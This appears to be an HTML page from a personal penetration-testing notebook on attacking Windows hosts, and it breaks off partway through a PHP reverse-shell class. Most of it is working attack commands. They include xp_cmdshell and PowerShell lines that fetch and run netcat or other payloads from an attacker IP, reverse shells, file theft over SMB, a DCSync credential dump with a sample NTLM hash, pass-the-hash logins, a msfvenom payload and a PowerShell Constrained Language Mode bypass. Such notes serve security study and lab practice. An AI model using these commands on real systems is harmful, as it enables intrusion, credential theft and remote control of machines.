+<li class="chapter" data-level="" data-path="windows-machine.html"><a href="windows-machine.html#juicypotato"><i class="fa fa-check"></i>JuicyPotato</a></li>
+<li class="chapter" data-level="" data-path="windows-machine.html"><a href="windows-machine.html#system-enumeration-with-powerup-for-privesc"><i class="fa fa-check"></i>System enumeration with PowerUp for Privesc</a></li>
+</ul></li>
+<li class="divider"></li>
+<li class="summary-footer"><a class="logo" href="https://lopezmichel.org"><img alt="IPESE" src="assets/wr404-transparent.png"></a></li>
+
+</ul>
+
+      </nav>
+    </div>
+
+    <div class="book-body">
+      <div class="body-inner">
+        <div class="book-header" role="navigation">
+          <h1>
+            <i class="fa fa-circle-o-notch fa-spin"></i><a href="./">2021 - Hacking Notes</a>
+          </h1>
+        </div>
+
+        <div class="page-wrapper" tabindex="-1" role="main">
+          <div class="page-inner">
+
+            <section class="normal" id="section-">
+<div id="windows-specific" class="section level1 unnumbered">
+<h1>Windows Specific</h1>
+<div id="ms-sql-server" class="section level2 unnumbered">
+<h2>MS SQL Server</h2>
+<p>For accessing to <strong>MS SQL SERVER</strong>, you can use <code>mssqliclient.py</code> utility from the impacket package that is available on kali or that you
+can clone from the <a href="https://github.com/SecureAuthCorp/impacket">impacket github repository</a>.</p>
+<div class="sourceCode" id="cb146"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb146-1"><a href="windows-specific.html#cb146-1"></a><span class="fu">locate</span> mssqlcli</span>
+<span id="cb146-2"><a href="windows-specific.html#cb146-2"></a><span class="ex">python3</span> mssqlclient.py -windows-auth <span class="op">&lt;</span>user<span class="op">&gt;</span>:<span class="op">&lt;</span>password<span class="op">&gt;</span>@10.10.10.10</span>
+<span id="cb146-3"><a href="windows-specific.html#cb146-3"></a><span class="ex">SQL</span><span class="op">&gt;</span></span></code></pre></div>
+<ol style="list-style-type: decimal">
+<li><p>check if db user have sysadmin priviledges</p>
+<div class="sourceCode" id="cb147"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb147-1"><a href="windows-specific.html#cb147-1"></a><span class="kw">select</span> <span class="ex">IS_SRVROLEMEMBER</span>(<span class="st">&#39;sysadmin&#39;</span>, <span class="st">&#39;&lt;user&gt;&#39;</span>)</span></code></pre></div>
+<p>if output is <strong>1</strong>, that means that the user is a priviledged user on the system</p></li>
+<li><p>execute commands</p>
+<div class="sourceCode" id="cb148"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb148-1"><a href="windows-specific.html#cb148-1"></a>EXEC xp_cmdshell &#39;echo %<span class="fu">cd</span>%&#39;</span>
+<span id="cb148-2"><a href="windows-specific.html#cb148-2"></a>xp_cmdshell powershell <span class="fu">wget</span> http://10.<span class="fu">10</span>.<span class="fu">10</span>.<span class="fu">11</span>:8000/nc.<span class="fu">exe</span> -OutFile %TEMP%\nc.<span class="fu">exe</span></span>
+<span id="cb148-3"><a href="windows-specific.html#cb148-3"></a>xp_cmdshell powershell <span class="st">&quot;%TEMP%\nc.exe -nv 10.10.10.11 443 -e cmd.exe</span></span></code></pre></div></li>
+</ol>
+</div>
+<div id="connect-to-machine-with-psexec" class="section level2 unnumbered">
+<h2>Connect to machine with PSEXEC</h2>
+<p><strong>psexec</strong> is a tool from the impacket package. You can use it to connect to windows machines with a user and password.</p>
+<div class="sourceCode" id="cb149"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb149-1"><a href="windows-specific.html#cb149-1"></a><span class="ex">python</span> psexec.py <span class="op">&lt;</span>user<span class="op">&gt;</span>@10.10.10.10</span></code></pre></div>
+</div>
+<div id="send-files-to-windows-machine" class="section level2 unnumbered">
+<h2>Send files to windows machine</h2>
+<div id="download-files-with-certutil" class="section level3 unnumbered">
+<h3>Download files with certutil</h3>
+<p><strong>certutil.exe</strong> is a netcat variant for Windows. It can be use for download files form the internet like a wget tool</p>
+<div class="sourceCode" id="cb150"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb150-1"><a href="windows-specific.html#cb150-1"></a>certutil.<span class="fu">exe</span> -f -urlcache -split http://10.<span class="fu">10</span>.<span class="fu">10</span>.<span class="fu">10</span>/chisel.<span class="fu">exe</span> C:\Windows\temp</span></code></pre></div>
+</div>
+<div id="download-files-by-using-powershell" class="section level3 unnumbered">
+<h3>Download files by using Powershell</h3>
+<div class="sourceCode" id="cb151"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb151-1"><a href="windows-specific.html#cb151-1"></a>powershell -c <span class="fu">iwr</span> -uri http://&lt;attacker_ip&gt;/&lt;file_to_download&gt; -OutFile C:\Windows\Temp\nc.<span class="fu">exe</span></span></code></pre></div>
+<div class="sourceCode" id="cb152"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb152-1"><a href="windows-specific.html#cb152-1"></a>powershell.<span class="fu">exe</span> <span class="fu">IEX</span>(<span class="fu">New-Object</span> Net.<span class="fu">WebClient</span>).<span class="fu">downloadString</span>(&#39;http://10.<span class="fu">10</span>.<span class="fu">10</span>.<span class="fu">10</span>/&lt;file_to_download_and_execute&#39;)</span></code></pre></div>
+</div>
+<div id="share-smb-directory-with-windows-machine" class="section level3 unnumbered">
+<h3>Share SMB directory with Windows Machine</h3>
+<p>Imaging we want to execute nc.exe on the Windows machine but this one don’t have <strong>nc.exe</strong>. We can download nc.exe and execute
+it by sharing a SMB folder.</p>
+<ol style="list-style-type: decimal">
+<li><p>On attacker machine</p>
+<div class="sourceCode" id="cb153"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb153-1"><a href="windows-specific.html#cb153-1"></a><span class="ex">impacket-smbserver</span> smbFolder <span class="va">$(</span><span class="bu">pwd</span><span class="va">)</span> -smb2support</span></code></pre></div></li>
+<li><p>On windows machine</p>
+<div class="sourceCode" id="cb154"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb154-1"><a href="windows-specific.html#cb154-1"></a>\\10.<span class="fu">10</span>.<span class="fu">10</span>.<span class="fu">10</span>\smbFolder\nc.<span class="fu">exe</span> -e cmd 10.<span class="fu">10</span>.<span class="fu">10</span>.<span class="fu">10</span> 443</span></code></pre></div></li>
+</ol>
+<p>Share SMB can also be usefull to send files from the victim to the attacker machine. Imagine now that we want to retrieve file.txt
+from the victim to the attacker machine.</p>
+<ol style="list-style-type: decimal">
+<li><p>On attacker machine</p>
+<div class="sourceCode" id="cb155"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb155-1"><a href="windows-specific.html#cb155-1"></a><span class="ex">impacket-smbserver</span> smbFolder <span class="va">$(</span><span class="bu">pwd</span><span class="va">)</span> -smb2support</span></code></pre></div></li>
+<li><p>On windows machine</p>
+<div class="sourceCode" id="cb156"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb156-1"><a href="windows-specific.html#cb156-1"></a><span class="fu">copy</span> file.<span class="fu">txt</span> \\10.<span class="fu">10</span>.<span class="fu">10</span>.<span class="fu">11</span>\smbFolder\file.<span class="fu">txt</span></span></code></pre></div></li>
+</ol>
+<p>It can appear that this technic will not work because of <code>ERROR: The specified server cannot perform the requested operation.</code> error.
+The solution here will be to assign a user and password for this share resource.</p>
+<ol style="list-style-type: decimal">
+<li><p>On attacker machine</p>
+<div class="sourceCode" id="cb157"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb157-1"><a href="windows-specific.html#cb157-1"></a><span class="ex">impacket-smbserver</span> smbFolder <span class="va">$(</span><span class="bu">pwd</span><span class="va">)</span> smb2support -username looping -password looping</span></code></pre></div></li>
+<li><p>On victim machine, create a logical unit binded to this shared resource</p>
+<div class="sourceCode" id="cb158"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb158-1"><a href="windows-specific.html#cb158-1"></a>net use x: \\10.<span class="fu">10</span>.<span class="fu">10</span>.<span class="fu">11</span>\smbFolder /user:looping looping</span></code></pre></div></li>
+<li><p>You can then copy the desired file directly into x: logical unit</p>
+<div class="sourceCode" id="cb159"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb159-1"><a href="windows-specific.html#cb159-1"></a><span class="fu">copy</span> file.<span class="fu">txt</span> x:\file.<span class="fu">txt</span></span></code></pre></div></li>
+</ol>
+</div>
+</div>
+<div id="connection-throw-winrm-with-evil-winrm" class="section level2 unnumbered">
+<h2>Connection throw WinRM with evil-winrm</h2>
+<p>If you have user credentials and the machine have port 5985 or WinRM running in another port, you can connect to the machine
+with <strong>evil-winrm</strong> tool</p>
+<ol style="list-style-type: decimal">
+<li><p>Install evil-winrm</p>
+<div class="sourceCode" id="cb160"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb160-1"><a href="windows-specific.html#cb160-1"></a><span class="fu">sudo</span> gem install evil-winrm</span></code></pre></div></li>
+<li><p>Connect with evil-winrm</p>
+<div class="sourceCode" id="cb161"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb161-1"><a href="windows-specific.html#cb161-1"></a><span class="ex">evil-winrm</span> -i 10.10.10.10 -u <span class="st">&#39;username&#39;</span> -p <span class="st">&#39;Password1234&#39;</span></span></code></pre></div></li>
+<li><p>Connect by ssl</p>
+<div class="sourceCode" id="cb162"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb162-1"><a href="windows-specific.html#cb162-1"></a><span class="ex">evil-winrm</span> -S -c certnew.cer -k private.key -i 10.10.10.10 -u <span class="st">&#39;username&#39;</span> -p <span class="st">&#39;Password1234&#39;</span></span></code></pre></div></li>
+</ol>
+</div>
+<div id="exploit-getchangesall-privilege-vulnerability" class="section level2 unnumbered">
+<h2>Exploit GetChangesAll privilege vulnerability</h2>
+<p>The <strong>GetChangesAll</strong> privilege can be considert as a vunlnerability when you have the credentials of this user, because attacker cannot
+perform a DCSync attack in order to dump the NTLM of all domain users.
+You can check if user have this privilege with a tool like <strong>Bloodhound</strong>.</p>
+<p>To perform this kind of attack you can use the <strong>secretsdump.py</strong> script who comes with te Impacket library</p>
+<div class="sourceCode" id="cb163"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb163-1"><a href="windows-specific.html#cb163-1"></a><span class="fu">locate</span> secretsdump</span>
+<span id="cb163-2"><a href="windows-specific.html#cb163-2"></a><span class="ex">secretsdump.py</span> -dc-ip 10.10.10.10 DOMAIN.NAME/user:Password1234@10.10.10.10</span>
+<span id="cb163-3"><a href="windows-specific.html#cb163-3"></a></span>
+<span id="cb163-4"><a href="windows-specific.html#cb163-4"></a><span class="co">#OUTPUT</span></span>
+<span id="cb163-5"><a href="windows-specific.html#cb163-5"></a>[<span class="ex">-</span>] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied </span>
+<span id="cb163-6"><a href="windows-specific.html#cb163-6"></a>[<span class="ex">*</span>] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span>
+<span id="cb163-7"><a href="windows-specific.html#cb163-7"></a>[<span class="ex">*</span>] Using the DRSUAPI method to get NTDS.DIT secrets</span>
+<span id="cb163-8"><a href="windows-specific.html#cb163-8"></a><span class="ex">Administrator</span>:500:aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18:::</span></code></pre></div>
+<p>You can then connect to the victim machine by using psexec.py</p>
+<div class="sourceCode" id="cb164"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb164-1"><a href="windows-specific.html#cb164-1"></a><span class="ex">psexec.py</span> domain.name/administrator@10.10.10.10 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18</span></code></pre></div>
+<p>You can also use the impacket-wmiexec to connect to the victim machine.</p>
+<div class="sourceCode" id="cb165"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb165-1"><a href="windows-specific.html#cb165-1"></a><span class="ex">impacket-wmiexec</span> domain.name/administrator@10.10.10.10 -hashes :8a4b77d52b1845bfe949ed1b9643bb18</span></code></pre></div>
+</div>
+<div id="powershell-access-with-nishang" class="section level2 unnumbered">
+<h2>Powershell access with Nishang</h2>
+<p>Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration
+testing and red teaming. Nishang is useful during all phases of penetration testing.</p>
+<p>By nikhil_mitt</p>
+<p><a href="https://github.com/samratashok/nishang">Nishang github</a></p>
+<div id="invoke-powershelltcp.ps1" class="section level3 unnumbered">
+<h3>Invoke-PowerShelltcp.ps1</h3>
+<p>Script that send a reverse shell with powershell on TCP protocol.</p>
+<ol style="list-style-type: decimal">
+<li><p>Open the script</p>
+<div class="sourceCode" id="cb166"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb166-1"><a href="windows-specific.html#cb166-1"></a><span class="bu">cd</span> nishang/Shells/</span>
+<span id="cb166-2"><a href="windows-specific.html#cb166-2"></a><span class="ex">vi</span> Invoke-PowerShelltcp.ps1</span></code></pre></div></li>
+<li><p>Copy one of the examples that are at the begining of the file and paste it at the end of it.</p></li>
+<li><p>Of course change the ip address and the port by the attackers one</p></li>
+</ol>
+</div>
+</div>
+<div id="create-a-reverse-shell-with-msfvenom" class="section level2 unnumbered">
+<h2>Create a reverse shell with msfvenom</h2>
+<div class="sourceCode" id="cb167"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb167-1"><a href="windows-specific.html#cb167-1"></a><span class="ex">msfvenom</span> -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe -o reverse.exe </span></code></pre></div>
+</div>
+<div id="bypass-constraint-language-in-a-powershell" class="section level2 unnumbered">
+<h2>Bypass Constraint Language in a PowerShell</h2>
+<p>It’s possible that sometimes, when you gain access to a windows machine and you have a PowerShell, that this is on
+<strong>constraint language</strong> context. In the victim machine, you can check that with the <code>$ExecutionContext.SessionState.LanguageMode</code>
+command.</p>
+<p>With the use of <a href="https://github.com/padovah4ck/PSByPassCLM">PSByPassCLM</a>, by creating
+a new reverse shell, you can bypass this context.</p>
+<ol style="list-style-type: decimal">
+<li><p>clone the PSByPassCLM repository</p>
+<div class="sourceCode" id="cb168"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb168-1"><a href="windows-specific.html#cb168-1"></a><span class="fu">git</span> clone https://github.com/padovah4ck/PSByPassCLM</span></code></pre></div></li>
+<li><p>Transfer PSByPassCLM.exe to the victim machine</p>
+<ul>
+<li><p>on the attacker machine</p>
+<div class="sourceCode" id="cb169"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb169-1"><a href="windows-specific.html#cb169-1"></a><span class="bu">cd</span> PSByPassCLM/PSByPassCLM/PSBypassCLM/bin/x64/Debug</span>
+<span id="cb169-2"><a href="windows-specific.html#cb169-2"></a><span class="ex">python</span> -m http.server 80</span></code></pre></div></li>
+<li><p>on the victim machine</p>
+<div class="sourceCode" id="cb170"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb170-1"><a href="windows-specific.html#cb170-1"></a><span class="fu">iwr</span> -uri http://10.<span class="fu">10</span>.<span class="fu">10</span>.<span class="fu">11</span>/PsByPassCLM.<span class="fu">exe</span> -OutFile c:\temp\psby.<span class="fu">exe</span></span></code></pre></div></li>
+</ul></li>
+<li><p>Create the reverse connection</p>
+<ul>
+<li><p>on the attacker machine</p>
+<div class="sourceCode" id="cb171"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb171-1"><a href="windows-specific.html#cb171-1"></a><span class="ex">rlwrap</span> nc -nlvp 443</span></code></pre></div></li>
+<li><p>on the victim machine</p>
+<div class="sourceCode" id="cb172"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb172-1"><a href="windows-specific.html#cb172-1"></a>C:\Windows\Microsoft.<span class="fu">NET</span>\Framework64\v4.<span class="fu">0</span>.<span class="fu">30319</span>\InstallUtil.<span class="fu">exe</span> /logfile= /LogToConsole=true /revshell=true /rhost=10.<span class="fu">10</span>.<span class="fu">10</span>.<span class="fu">11</span> /rport=443 /U c:\temp\psby.<span class="fu">exe</span></span></code></pre></div></li>
+</ul></li>
+</ol>
+<p>In the new shell session, if you write the <code>$ExecutionContext.SessionState.LanguageMode</code>, you will be able to check if now you are in a <strong>FullLanguage</strong> context.</p>
+</div>
+<div id="shells-for-windows" class="section level2 unnumbered">
+<h2>Shells for windows</h2>
+<div id="php" class="section level3 unnumbered">
+<h3>PHP</h3>
+<div class="sourceCode" id="cb173"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb173-1"><a href="windows-specific.html#cb173-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb173-2"><a href="windows-specific.html#cb173-2"></a><span class="co">// Copyright (c) 2020 Ivan Šincek</span></span>
+<span id="cb173-3"><a href="windows-specific.html#cb173-3"></a><span class="co">// v2.3</span></span>
+<span id="cb173-4"><a href="windows-specific.html#cb173-4"></a><span class="co">// Requires PHP v5.0.0 or greater.</span></span>
+<span id="cb173-5"><a href="windows-specific.html#cb173-5"></a><span class="co">// Works on Linux OS, macOS, and Windows OS.</span></span>
+<span id="cb173-6"><a href="windows-specific.html#cb173-6"></a><span class="co">// See the original script at https://github.com/pentestmonkey/php-reverse-shell.</span></span>
+<span id="cb173-7"><a href="windows-specific.html#cb173-7"></a><span class="kw">class</span> Shell {</span>
+<span id="cb173-8"><a href="windows-specific.html#cb173-8"></a>    <span class="kw">private</span> <span class="kw">$addr</span>  = <span class="kw">null</span><span class="ot">;</span></span>
+<span id="cb173-9"><a href="windows-specific.html#cb173-9"></a>    <span class="kw">private</span> <span class="kw">$port</span>  = <span class="kw">null</span><span class="ot">;</span></span>
+<span id="cb173-10"><a href="windows-specific.html#cb173-10"></a>    <span class="kw">private</span> <span class="kw">$os</span>    = <span class="kw">null</span><span class="ot">;</span></span>
+<span id="cb173-11"><a href="windows-specific.html#cb173-11"></a>    <span class="kw">private</span> <span class="kw">$shell</span> = <span class="kw">null</span><span class="ot">;</span></span>
+<span id="cb173-12"><a href="windows-specific.html#cb173-12"></a>    <span class="kw">private</span> <span class="kw">$descriptorspec</span> = <span class="kw">array</span><span class="ot">(</span></span>
+<span id="cb173-13"><a href="windows-specific.html#cb173-13"></a>        <span class="dv">0</span> =&gt; <span class="kw">array</span><span class="ot">(</span><span class="st">&#39;pipe&#39;</span><span class="ot">,</span> <span class="st">&#39;r&#39;</span><span class="ot">),</span> <span class="co">// shell can read from STDIN</span></span>
+<span id="cb173-14"><a href="windows-specific.html#cb173-14"></a>        <span class="dv">1</span> =&gt; <span class="kw">array</span><span class="ot">(</span><span class="st">&#39;pipe&#39;</span><span class="ot">,</span> <span class="st">&#39;w&#39;</span><span class="ot">),</span> <span class="co">// shell can write to STDOUT</span></span>
+<span id="cb173-15"><a href="windows-specific.html#cb173-15"></a>        <span class="dv">2</span> =&gt; <span class="kw">array</span><span class="ot">(</span><span class="st">&#39;pipe&#39;</span><span class="ot">,</span> <span class="st">&#39;w&#39;</span><span class="ot">)</span>  <span class="co">// shell can write to STDERR</span></span>
+<span id="cb173-16"><a href="windows-specific.html#cb173-16"></a>    <span class="ot">);</span></span>
+<span id="cb173-17"><a href="windows-specific.html#cb173-17"></a>    <span class="kw">private</span> <span class="kw">$buffer</span>  = <span class="dv">1024</span><span class="ot">;</span>    <span class="co">// read/write buffer size</span></span>
+<span id="cb173-18"><a href="windows-specific.html#cb173-18"></a>    <span class="kw">private</span> <span class="kw">$clen</span>    = <span class="dv">0</span><span class="ot">;</span>       <span class="co">// command length</span></span>
+<span id="cb173-19"><a href="windows-specific.html#cb173-19"></a>    <span class="kw">private</span> <span class="kw">$error</span>   = <span class="kw">false</span><span class="ot">;</span>   <span class="co">// stream read/write error</span></span>
+<span id="cb173-20"><a href="windows-specific.html#cb173-20"></a>    <span class="kw">public</span> <span class="kw">function</span> <span class="fu">__construct</span><span class="ot">(</span><span class="kw">$addr</span><span class="ot">,</span> <span class="kw">$port</span><span class="ot">)</span> {</span>
+<span id="cb173-21"><a href="windows-specific.html#cb173-21"></a>        <span class="kw">$this</span>-&gt;addr = <span class="kw">$addr</span><span class="ot">;</span></span>
+<span id="cb173-22"><a href="windows-specific.html#cb173-22"></a>        <span class="kw">$this</span>-&gt;port = <span class="kw">$port</span><span class="ot">;</span></span>
+<span id="cb173-23"><a href="windows-specific.html#cb173-23"></a>    }</span>
+<span id="cb173-24"><a href="windows-specific.html#cb173-24"></a>    <span class="kw">private</span> <span class="kw">function</span> detect<span class="ot">()</span> {</span>
+<span id="cb173-25"><a href="windows-specific.html#cb173-25"></a>        <span class="kw">$detected</span> = <span class="kw">true</span><span class="ot">;</span></span>
+<span id="cb173-26"><a href="windows-specific.html#cb173-26"></a>        <span class="kw">if</span> <span class="ot">(</span><span class="fu">stripos</span><span class="ot">(</span><span class="kw">PHP_OS</span><span class="ot">,</span> <span class="st">&#39;LINUX&#39;</span><span class="ot">)</span> !== <span class="kw">false</span><span class="ot">)</span> { <span class="co">// same for macOS</span></span>
+<span id="cb173-27"><a href="windows-specific.html#cb173-27"></a>            <span class="kw">$this</span>-&gt;os    = <span class="st">&#39;LINUX&#39;</span><span class="ot">;</span></span>
+<span id="cb173-28"><a href="windows-specific.html#cb173-28"></a>            <span class="kw">$this</span>-&gt;shell = <span class="st">&#39;/bin/sh&#39;</span><span class="ot">;</span></span>
+<span id="cb173-29"><a href="windows-specific.html#cb173-29"></a>        } <span class="kw">else</span> <span class="kw">if</span> <span class="ot">(</span><span class="fu">stripos</span><span class="ot">(</span><span class="kw">PHP_OS</span><span class="ot">,</span> <span class="st">&#39;WIN32&#39;</span><span class="ot">)</span> !== <span class="kw">false</span> || <span class="fu">stripos</span><span class="ot">(</span><span class="kw">PHP_OS</span><span class="ot">,</span> <span class="st">&#39;WINNT&#39;</span><span class="ot">)</span> !== <span class="kw">false</span> || <span class="fu">stripos</span><span class="ot">(</span><span class="kw">PHP_OS</span><span class="ot">,</span> <span class="st">&#39;WINDOWS&#39;</span><span class="ot">)</span> !== <span class="kw">false</span><span class="ot">)</span> {</span>
+<span id="cb173-30"><a href="windows-specific.html#cb173-30"></a>            <span class="kw">$this</span>-&gt;os    = <span class="st">&#39;WINDOWS&#39;</span><span class="ot">;</span></span>
+<span id="cb173-31"><a href="windows-specific.html#cb173-31"></a>            <span class="kw">$this</span>-&gt;shell = <span class="st">&#39;cmd.exe&#39;</span><span class="ot">;</span></span>
+<span id="cb173-32"><a href="windows-specific.html#cb173-32"></a>        } <span class="kw">else</span> {</span>
+<span id="cb173-33"><a href="windows-specific.html#cb173-33"></a>            <span class="kw">$detected</span> = <span class="kw">false</span><span class="ot">;</span></span>
+<span id="cb173-34"><a href="windows-specific.html#cb173-34"></a>            <span class="kw">echo</span> <span class="st">&quot;SYS_ERROR: Underlying operating system is not supported, script will now exit...</span><span class="kw">\n</span><span class="st">&quot;</span><span class="ot">;</span></span>
+<span id="cb173-35"><a href="windows-specific.html#cb173-35"></a>        }</span>
+<span id="cb173-36"><a href="windows-specific.html#cb173-36"></a>        <span class="kw">return</span> <span class="kw">$detected</span><span class="ot">;</span></span>
+<span id="cb173-37"><a href="windows-specific.html#cb173-37"></a>    }</span>
+<span id="cb173-38"><a href="windows-specific.html#cb173-38"></a>    <span class="kw">private</span> <span class="kw">function</span> daemonize<span class="ot">()</span> {</span>
+<span id="cb173-39"><a href="windows-specific.html#cb173-39"></a>        <span class="kw">$exit</span> = <span class="kw">false</span><span class="ot">;</span></span>
+<span id="cb173-40"><a href="windows-specific.html#cb173-40"></a>        <span class="kw">if</span> <span class="ot">(</span>!<span class="fu">function_exists</span><span class="ot">(</span><span class="st">&#39;pcntl_fork&#39;</span><span class="ot">))</span> {</span>
+<span id="cb173-41"><a href="windows-specific.html#cb173-41"></a>            <span class="kw">echo</span> <span class="st">&quot;DAEMONIZE: pcntl_fork() does not exists, moving on...</span><span class="kw">\n</span><span class="st">&quot;</span><span class="ot">;</span></span>
+<span id="cb173-42"><a href="windows-specific.html#cb173-42"></a>        } <span class="kw">else</span> <span class="kw">if</span> <span class="ot">((</span><span class="kw">$pid</span> = <span class="er">@</span><span class="fu">pcntl_fork</span><span class="ot">())</span> &lt; <span class="dv">0</span><span class="ot">)</span> {</span>
+<span id="cb173-43"><a href="windows-specific.html#cb173-43"></a>            <span class="kw">echo</span> <span class="st">&quot;DAEMONIZE: Cannot fork off the parent process, moving on...</span><span class="kw">\n</span><span class="st">&quot;</span><span class="ot">;</span></span>
+<span id="cb173-44"><a href="windows-specific.html#cb173-44"></a>        } <span class="kw">else</span> <span class="kw">if</span> <span class="ot">(</span><span class="kw">$pid</span> &gt; <span class="dv">0</span><span class="ot">)</span> {</span>
+<span id="cb173-45"><a href="windows-specific.html#cb173-45"></a>            <span class="kw">$exit</span> = <span class="kw">true</span><span class="ot">;</span></span>
+<span id="cb173-46"><a href="windows-specific.html#cb173-46"></a>            <span class="kw">echo</span> <span class="st">&quot;DAEMONIZE: Child process forked off successfully, parent process will now exit...</span><span class="kw">\n</span><span class="st">&quot;</span><span class="ot">;</span></span>
+<span id="cb173-47"><a href="windows-specific.html#cb173-47"></a>        } <span class="kw">else</span> <span class="kw">if</span> <span class="ot">(</span><span class="fu">posix_setsid</span><span class="ot">()</span> &lt; <span class="dv">0</span><span class="ot">)</span> {</span>
+<span id="cb173-48"><a href="windows-specific.html#cb173-48"></a>            <span class="co">// once daemonized you will actually no longer see the script&#39;s dump</span></span>
+<span id="cb173-49"><a href="windows-specific.html#cb173-49"></a>            <span class="kw">echo</span> <span class="st">&quot;DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...</span><span class="kw">\n</span><span class="st">&quot;</span><span class="ot">;</span></span>
+<span id="cb173-50"><a href="windows-specific.html#cb173-50"></a>        } <span class="kw">else</span> {</span>
+<span id="cb173-51"><a href="windows-specific.html#cb173-51"></a>            <span class="kw">echo</span> <span class="st">&quot;DAEMONIZE: Completed successfully!</span><span class="kw">\n</span><span class="st">&quot;</span><span class="ot">;</span></span>
+<span id="cb173-52"><a href="windows-specific.html#cb173-52"></a>        }</span>
+<span id="cb173-53"><a href="windows-specific.html#cb173-53"></a>        <span class="kw">return</span> <span class="kw">$exit</span><span class="ot">;</span></span>
+<span id="cb173-54"><a href="windows-specific.html#cb173-54"></a>    }</span>
+<span id="cb173-55"><a href="windows-specific.html#cb173-55"></a>    <span class="kw">private</span> <span class="kw">function</span> settings<span class="ot">()</span> {</span>
+<span id="cb173-56"><a href="windows-specific.html#cb173-56"></a>        <span class="er">@</span><span class="fu">error_reporting</span><span class="ot">(</span><span class="dv">0</span><span class="ot">);</span></span>
+<span id="cb173-57"><a href="windows-specific.html#cb173-57"></a>        <span class="er">@</span><span class="fu">set_time_limit</span><span class="ot">(</span><span class="dv">0</span><span class="ot">);</span> <span class="co">// do not impose the script execution time limit</span></span>
+<span id="cb173-58"><a href="windows-specific.html#cb173-58"></a>        <span class="er">@</span><span class="fu">umask</span><span class="ot">(</span><span class="dv">0</span><span class="ot">);</span> <span class="co">// set the file/directory permissions - 666 for files and 777 for directories</span></span>
+<span id="cb173-59"><a href="windows-specific.html#cb173-59"></a>    }</span>
+<span id="cb173-60"><a href="windows-specific.html#cb173-60"></a>    <span class="kw">private</span> <span class="kw">function</span> dump<span class="ot">(</span><span class="kw">$data</span><span class="ot">)</span> {</span>
+<span id="cb173-61"><a href="windows-specific.html#cb173-61"></a>        <span class="kw">$data</span> = <span class="fu">str_replace</span><span class="ot">(</span><span class="st">&#39;&lt;&#39;</span><span class="ot">,</span> <span class="st">&#39;&amp;lt;&#39;</span><span class="ot">,</span> <span class="kw">$data</span><span class="ot">);</span></span>
+<span id="cb173-62"><a href="windows-specific.html#cb173-62"></a>        <span class="kw">$data</span> = <span class="fu">str_replace</span><span class="ot">(</span><span class="st">&#39;&gt;&#39;</span><span class="ot">,</span> <span class="st">&#39;&amp;gt;&#39;</span><span class="ot">,</span> <span class="kw">$data</span><span class="ot">);</span></span>
+<span id="cb173-63"><a href="windows-specific.html#cb173-63"></a>        <span class="kw">echo</span> <span class="kw">$data</span><span class="ot">;</span></span>
+<span id="cb173-64"><a href="windows-specific.html#cb173-64"></a>    }</span>
+<span id="cb173-65"><a href="windows-specific.html#cb173-65"></a>    <span class="kw">private</span> <span class="kw">function</span> read<span class="ot">(</span><span class="kw">$stream</span><span class="ot">,</span> <span class="kw">$name</span><span class="ot">,</span> <span class="kw">$buffer</span><span class="ot">)</span> {</span>
+<span id="cb173-66"><a href="windows-specific.html#cb173-66"></a>        <span class="kw">if</span> <span class="ot">((</span><span class="kw">$data</span> = <span class="er">@</span><span class="fu">fread</span><span class="ot">(</span><span class="kw">$stream</span><span class="ot">,</span> <span class="kw">$buffer</span><span class="ot">))</span> === <span class="kw">false</span><span class="ot">)</span> { <span class="co">// suppress an error when reading from a closed blocking stream</span></span>
+<span id="cb173-67"><a href="windows-specific.html#cb173-67"></a>            <span class="kw">$this</span>-&gt;<span class="kw">error</span> = <span class="kw">true</span><span class="ot">;</span>                            <span class="co">// set global error flag</span></span>
+<span id="cb173-68"><a href="windows-specific.html#cb173-68"></a>            <span class="kw">echo</span> <span class="st">&quot;STRM_ERROR: Cannot read from </span><span class="kw">${name}</span><span class="st">, script will now exit...</span><span class="kw">\n</span><span class="st">&quot;</span><span class="ot">;</span></span>
+<span id="cb173-69"><a href="windows-specific.html#cb173-69"></a>        }</span>
+<span id="cb173-70"><a href="windows-specific.html#cb173-70"></a>        <span class="kw">return</span> <span class="kw">$data</span><span class="ot">;</span></span>
+<span id="cb173-71"><a href="windows-specific.html#cb173-71"></a>    }</span>
+<span id="cb173-72"><a href="windows-specific.html#cb173-72"></a>    <span class="kw">private</span> <span class="kw">function</span> write<span class="ot">(</span><span class="kw">$stream</span><span class="ot">,</span> <span class="kw">$name</span><span class="ot">,</span> <span class="kw">$data</span><span class="ot">)</span> {</span>
